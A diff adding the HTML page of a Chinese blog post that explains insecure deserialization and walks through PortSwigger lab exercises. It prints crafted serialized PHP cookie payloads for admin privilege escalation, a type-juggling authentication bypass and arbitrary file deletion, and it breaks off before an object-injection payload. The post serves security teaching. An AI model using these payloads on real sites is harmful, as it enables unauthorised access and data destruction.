@@ -1,0 +1,1284 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/header.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/header.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/header.jpg?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="web,不安全的序列化," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="joker0xxx3's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="​    该漏洞的原因出自于如果应用对不可信的数据，例如恶意构造的用户输入进行反序列化，从而产生非预期的对象，从而有可能产生远程代码执行。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不安全的序列化">
+<meta property="og:url" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="joker0xxx3&#39;s Blog">
+<meta property="og:description" content="​    该漏洞的原因出自于如果应用对不可信的数据，例如恶意构造的用户输入进行反序列化，从而产生非预期的对象，从而有可能产生远程代码执行。">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200719141510301.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720142625289.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720142718744.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720143346469.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720144700225.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720145854723.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720154325150.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720154859807.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720164733193.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720175610222.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200721145619238.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200721145935109.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200721150254347.png">
+<meta property="og:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200721152950252.png">
+<meta property="article:published_time" content="2020-07-21T07:46:33.000Z">
+<meta property="article:modified_time" content="2020-07-21T07:48:44.986Z">
+<meta property="article:author" content="joker0xxx3">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="不安全的序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200719141510301.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://joker-vip.github.io/2020/07/21/不安全的反序列化/"/>
+
+
+
+
+
+  <title>不安全的序列化 | joker0xxx3's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/joker-vip" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+	
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">joker0xxx3's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">现实告诉我： 保持好奇心，享受孤独</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="joker0xxx3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="joker0xxx3's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">不安全的序列化</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+		    
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-21T15:46:33+08:00">
+                2020-07-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index">
+                    <span itemprop="name">不安全的序列化</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>​    该漏洞的原因出自于如果应用对不可信的数据，例如恶意构造的用户输入进行反序列化，从而产生非预期的对象，从而有可能产生远程代码执行。</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200719141510301.png" alt="image-20200719141510301"></p>
+<a id="more"></a>
+
+<h2 id="1-什么是序列化？"><a href="#1-什么是序列化？" class="headerlink" title="1. 什么是序列化？"></a>1. 什么是序列化？</h2><p>​    <strong>序列化</strong>是将复杂的数据结构（例如对象及其字段）转换为“更扁平”格式的过程，该格式可以作为字节顺序流发送和接收。序列化数据使其更容易：</p>
+<ul>
+<li>将复杂数据写入进程间内存，文件或数据库</li>
+<li>例如，通过网络，在应用程序的不同组件之间或在API调用中发送复杂的数据</li>
+</ul>
+<p>​    至关重要的是，在序列化对象时，其状态也将保留下来。换句话说，将保留对象的属性及其分配的值。</p>
+<h2 id="2-序列化与反序列化"><a href="#2-序列化与反序列化" class="headerlink" title="2.序列化与反序列化"></a>2.序列化与反序列化</h2><p>​    <strong>反序列化</strong>是将字节流还原为原始对象的完整功能副本的过程，其状态与序列化时的状态完全相同。然后，网站的逻辑可以与此反序列化的对象进行交互，就像与任何其他对象进行交互一样。</p>
+<h2 id="3-什么是不安全的反序列化？"><a href="#3-什么是不安全的反序列化？" class="headerlink" title="3. 什么是不安全的反序列化？"></a>3. 什么是不安全的反序列化？</h2><p>​    不安全的反序列化是指网站对用户可控制的数据进行反序列化时。这可能使攻击者能够操纵序列化的对象，以将有害数据传递到应用程序代码中。</p>
+<p>​    甚至有可能用完全不同类的对象替换序列化的对象。令人震惊的是，将对网站可用的任何类别的对象进行反序列化和实例化，而与预期的类别无关。因此，不安全的反序列化有时称为“对象注入”漏洞。</p>
+<p>​    意外类的对象可能会导致异常。但是，到此时，损坏可能已经造成。许多基于反序列化的攻击是<strong>在</strong>反序列化完成<strong>之前</strong>完成的。这意味着即使网站本身的功能未与恶意对象直接交互，反序列化过程本身也可以发起攻击。因此，其逻辑基于强类型语言的网站也可能容易受到这些技术的攻击。</p>
+<h2 id="4-不安全的反序列化漏洞如何产生？"><a href="#4-不安全的反序列化漏洞如何产生？" class="headerlink" title="4. 不安全的反序列化漏洞如何产生？"></a>4. 不安全的反序列化漏洞如何产生？</h2><p>​    由于通常认为反序列化对象是可信任的，因此也可能会出现漏洞。尤其是当使用具有二进制序列化格式的语言时，开发人员可能会认为用户无法有效读取或操纵数据。但是，尽管可能需要更多的精力，但攻击者有可能利用二进制序列化的对象，就像利用基于字符串的格式一样。</p>
+<h2 id="5-不安全的反序列化有何影响？"><a href="#5-不安全的反序列化有何影响？" class="headerlink" title="5. 不安全的反序列化有何影响？"></a>5. 不安全的反序列化有何影响？</h2><p>​    不安全的反序列化的影响可能非常严重，因为它为大规模增加攻击面提供了切入点。它允许攻击者以有害的方式重用现有的应用程序代码，从而导致许多其他漏洞，通常是远程执行代码。</p>
+<p>​    即使在无法执行远程代码的情况下，不安全的反序列化也可能导致特权升级，任意文件访问和拒绝服务攻击。</p>
+<h2 id="6-利用不安全的反序列化漏洞"><a href="#6-利用不安全的反序列化漏洞" class="headerlink" title="6. 利用不安全的反序列化漏洞"></a>6. 利用不安全的反序列化漏洞</h2><h4 id="6-1-识别序列化"><a href="#6-1-识别序列化" class="headerlink" title="6.1 识别序列化"></a>6.1 识别序列化</h4><h5 id="6-1-1-PHP序列化格式"><a href="#6-1-1-PHP序列化格式" class="headerlink" title="6.1.1 PHP序列化格式"></a>6.1.1 PHP序列化格式</h5><p>​    PHP使用一种人类可读的字符串格式，其中字母代表数据类型，数字代表每个条目的长度。例如，考虑<code>User</code>具有以下属性的对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;name &#x3D; &quot;carlos&quot;;</span><br><span class="line">$user-&gt;isLoggedIn &#x3D; true;</span><br></pre></td></tr></table></figure>
+
+<p>​    序列化后，该对象可能看起来像这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;:s:6:&quot;carlos&quot;; s:10:&quot;isLoggedIn&quot;:b:1;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    可以解释如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot; -具有4个字符的类名称的对象 &quot;User&quot;</span><br><span class="line">2 -对象具有2个属性</span><br><span class="line">s:4:&quot;name&quot; -第一个属性的键是4个字符的字符串 &quot;name&quot;</span><br><span class="line">s:6:&quot;carlos&quot; -第一个属性的值是6个字符的字符串 &quot;carlos&quot;</span><br><span class="line">s:10:&quot;isLoggedIn&quot; -第二个属性的键是10个字符的字符串 &quot;isLoggedIn&quot;</span><br><span class="line">b:1 -第二个属性的值是布尔值 true</span><br></pre></td></tr></table></figure>
+
+<p>​    PHP序列化的本机方法是<code>serialize()</code>和<code>unserialize()</code>。如果您具有源代码访问权限，则应从<code>unserialize()</code>代码中的任意位置开始并进行进一步调查。</p>
+<h5 id="6-1-2-Java序列化格式"><a href="#6-1-2-Java序列化格式" class="headerlink" title="6.1.2 Java序列化格式"></a>6.1.2 Java序列化格式</h5><p>​    某些语言（例如Java）使用二进制序列化格式。这更难以阅读，但是如果您知道如何识别一些明显的迹象，您仍然可以识别序列化的数据。例如，序列化的Java对象始终以相同的字节开头，这些字节的编码方式为十六进制和Base64。</p>
+<p>​    任何实现该接口的类<code>java.io.Serializable</code>都可以序列化和反序列化。如果您具有源代码访问权限，请注意使用该<code>readObject()</code>方法的所有代码，该方法用于从中读取和反序列化数据<code>InputStream</code>。</p>
+<h4 id="6-2-操作序列化对象"><a href="#6-2-操作序列化对象" class="headerlink" title="6.2 操作序列化对象"></a>6.2 操作序列化对象</h4><p>​    利用一些反序列化漏洞可以像更改序列化对象中的属性一样容易。随着对象状态的持久化，您可以研究序列化的数据以识别和编辑有趣的属性值。然后，您可以通过反序列化过程将恶意对象传递到网站中。这是基本反序列化利用的第一步。</p>
+<p>​    广义上讲，在处理序列化对象时可以采用两种方法。您可以直接以对象的字节流形式对其进行编辑，也可以使用相应的语言编写简短的脚本来自己创建和序列化新对象。使用二进制序列化格式时，后一种方法通常更容易。</p>
+<h5 id="6-2-1-修改对象属性"><a href="#6-2-1-修改对象属性" class="headerlink" title="6.2.1 修改对象属性"></a>6.2.1 修改对象属性</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects</a></p>
+<p>​    登录账户后，重新刷新首页，抓包：</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720142625289.png" alt="image-20200720142625289"></p>
+<p>​    可以看到cookie位置为base64加密后的数据，经过解码：</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720142718744.png" alt="image-20200720142718744"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:5:&quot;admin&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    得到一段序列化的数据，可以看到第二个字段为判断是否为admin，Boolean值为0，可以通过修改为1接着base64加密后重新发包。</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720143346469.png" alt="image-20200720143346469"></p>
+<p>​    可以访问admin界面了</p>
+<h5 id="6-2-2-修改数据类型"><a href="#6-2-2-修改数据类型" class="headerlink" title="6.2.2 修改数据类型"></a>6.2.2 修改数据类型</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types</a></p>
+<p>​    同样登录账户，刷新主页抓包得到base64编码后的cookie值，解码后得：</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720144700225.png" alt="image-20200720144700225"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;AeVESwbLNxZqqVmSo6z7qdj2aMzhfuTu&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    若要通过administrator账户登录，则需要通过修改序列化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    首先修改第一个字段的用户名，记得s后面的字符串个数也要修改。其次修改后面的token值，通过php的弱类型比较的逻辑缺陷（比较字符串整数时：0 == “Example string” // true），把后面的字符串个数修改为整数个数为0。重新base64编码发包。</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720145854723.png" alt="image-20200720145854723"></p>
+<h4 id="6-3-使用应用程序功能"><a href="#6-3-使用应用程序功能" class="headerlink" title="6.3 使用应用程序功能"></a>6.3 使用应用程序功能</h4><p>​    除了简单地检查属性值外，网站的功能还可能会对反序列化对象中的数据执行危险的操作。在这种情况下，您可以使用不安全的反序列化来传递意外数据，并利用相关功能造成损害。</p>
+<p>​    例如，作为网站“删除用户”功能的一部分，通过访问<code>$user-&gt;image_location</code>属性中的文件路径来删除用户的个人资料图片。如果这<code>$user</code>是从序列化对象创建的，则攻击者可以通过将带有<code>image_location</code>集合的已修改对象传递到任意文件路径来利用此漏洞。删除他们自己的用户帐户也将删除此任意文件。</p>
+<p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization</a></p>
+<p>​    登录账户，点击我的账户中可以看到有个删除账户，抓包得到一个POST请求包，对cookie解码得：</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720154325150.png" alt="image-20200720154325150"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;93JrRRDWHKoJFprg7nQAe0BVGCYvx5RH&quot;;s:11:&quot;avatar_link&quot;;s:19:&quot;users&#x2F;wiener&#x2F;avatar&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    可以看到最后一个字段的值是一个文件路径，可以通过修改文件路径来进行任意文件的删除，经过修改序列化数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;93JrRRDWHKoJFprg7nQAe0BVGCYvx5RH&quot;;s:11:&quot;avatar_link&quot;;s:23:&quot;&#x2F;home&#x2F;carlos&#x2F;morale.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    base64编码后重新发包，成功删除指定文件。</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720154859807.png" alt="image-20200720154859807"></p>
+<h4 id="6-4-魔术方法"><a href="#6-4-魔术方法" class="headerlink" title="6.4 魔术方法"></a>6.4 魔术方法</h4><p>​    魔术方法已被广泛使用，它们本身并不表示漏洞。但是，当它们执行的代码处理攻击者可控制的数据（例如来自反序列化对象的数据）时，它们可能会变得危险。当满足相应条件时，攻击者可以利用它来自动对反序列化的数据调用方法。</p>
+<h4 id="6-5-注入任意对象"><a href="#6-5-注入任意对象" class="headerlink" title="6.5 注入任意对象"></a>6.5 注入任意对象</h4><p>​    反序列化方法通常不会检查正在反序列化的内容。这意味着您可以传入网站可用的任何可序列化类的对象，并且该对象将被反序列化。这有效地使攻击者可以创建任意类的实例。该对象不是预期类的事实并不重要。意外的对象类型可能会导致应用程序逻辑中的异常，但是届时恶意对象将已经实例化。</p>
+<p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php</a></p>
+<p>​    在站点地图中，网站引用了文件<code>/libs/CustomTemplate.php</code>，文件名后加 ~ 字符查看源代码，进行代码审计。</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720164733193.png" alt="image-20200720164733193"></p>
+<p>​    在源代码中，请注意<code>CustomTemplate</code>该类包含<code>__destruct()</code>魔法方法。这将调用属性<code>unlink()</code>上的方法<code>lock_file_path</code>，这将删除此路径上的文件。</p>
+<p>​    通过构造序列化数据：</p>
